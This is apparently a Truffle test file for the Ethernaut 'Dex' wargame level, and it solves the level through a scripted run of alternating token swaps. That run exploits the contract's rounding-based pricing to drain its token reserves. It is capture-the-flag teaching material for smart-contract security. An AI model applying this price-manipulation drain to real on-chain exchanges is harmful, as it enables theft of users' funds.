const Ethernaut = artifacts.require('./Ethernaut.sol')
const DexFactory = artifacts.require('./levels/DexFactory.sol')
const SwappableToken = artifacts.require('./interfaces/SwappableToken.sol')

const Dex = artifacts.require('./levels/Dex.sol')
const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
const utils = require('../utils/TestUtils')


contract('Dex', function (accounts) {

    let ethernaut
    let level
    let owner = accounts[1]
    let player = accounts[0]
    let player_balance_1
    let player_balance_2
    console.log(`Owner is ${owner}`)
    console.log(`player is ${player}`)

    before(async function () {
        ethernaut = await Ethernaut.new()
        level = await DexFactory.new()
        await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function () {
        const instance = await utils.createLevelInstance(ethernaut, level.address, player, Dex)
        // Check init balances
        let token_one_address = await level.token_instance_address()
        let token_two_address = await level.token_instance_two_address()
        const [owner] = await ethers.getSigners()
        const tkn1 = new ethers.Contract(token_one_address, SwappableToken.abi, owner)
        const tkn2 = new ethers.Contract(token_two_address, SwappableToken.abi, owner)
        let token_one_balance = await tkn1.balanceOf(instance.address)
        let token_two_balance = await tkn2.balanceOf(instance.address)
        console.log(`init token balances are: ${token_one_balance} for TKN1 and ${token_two_balance} for TKN2`)
        player_balance_1 = await tkn1.balanceOf(player)
        player_balance_2 = await tkn2.balanceOf(player)
        console.log(`Balances of player are ${player_balance_1}, ${player_balance_2}`)
        assert.equal(token_one_balance, 100)
        assert.equal(token_two_balance, 100)

        // Start swapping
        await tkn1.approve(instance.address, 10, { from: player })
        await instance.swap(tkn1.address, tkn2.address, 10, { from: player })
        token_one_balance = await tkn1.balanceOf(instance.address)
        token_two_balance = await tkn2.balanceOf(instance.address)
        console.log(`new token balances are: ${token_one_balance} for TKN1 and ${token_two_balance} for TKN2 after first swap`)
        player_balance_1 = await tkn1.balanceOf(player)
        player_balance_2 = await tkn2.balanceOf(player)
        console.log(`Balances of player are ${player_balance_1}, ${player_balance_2}`)
        await tkn2.approve(instance.address, 20, { from: player })
        await instance.swap(tkn2.address, tkn1.address, 20, { from: player })
        await tkn1.approve(instance.address, 24, { from: player })
        await instance.swap(tkn1.address, tkn2.address, 24, { from: player })
        await tkn2.approve(instance.address, 30, { from: player })
        await instance.swap(tkn2.address, tkn1.address, 30, { from: player })
        await tkn1.approve(instance.address, 41, { from: player })
        await instance.swap(tkn1.address, tkn2.address, 41, { from: player })
        await tkn2.approve(instance.address, 45, { from: player })
        await instance.swap(tkn2.address, tkn1.address, 45, { from: player })
        token_one_balance = await tkn1.balanceOf(instance.address)
        token_two_balance = await tkn2.balanceOf(instance.address)
        console.log(`new token balances are: ${token_one_balance} for TKN1 and ${token_two_balance} for TKN2`)
        player_balance_1 = await tkn1.balanceOf(player)
        player_balance_2 = await tkn2.balanceOf(player)
        console.log(`Balances of player are ${player_balance_1}, ${player_balance_2}`)

        // Check win.
        const ethCompleted = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        )
        assert.equal(ethCompleted, true)


        // // Check transfer
        // await instance.transfer(accounts[2], 1, { from: player })
        // balance = (await instance.balanceOf(player))
        // console.log(`player balance: ${balance}`)
        // assert.equal(balance, 19)

        // // Overflow
        // await instance.transfer(accounts[2], 20, { from: player })
        // balance = (await instance.balanceOf(player))
        // console.log(`player balance: ${balance}`)
        // assert.equal(balance, 1.157920892373162e+77)

        // // Check win.
        // const ethCompleted = await utils.submitLevelInstance(
        //     ethernaut,
        //     level.address,
        //     instance.address,
        //     player
        // )
        // assert.equal(ethCompleted, true)
    })

})
